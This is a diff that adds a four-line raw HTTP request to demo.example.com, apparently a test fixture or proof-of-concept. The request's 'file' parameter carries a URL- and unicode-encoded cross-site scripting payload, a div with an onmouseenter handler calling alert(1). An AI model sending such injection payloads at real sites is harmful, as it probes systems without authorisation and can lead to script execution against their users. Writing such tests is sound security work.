@@ -1,0 +1,4 @@
+GET /a?file=\u003Cdiv%20onmouseenter%3Dalert(1)\u003Ehover\u003C/div\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
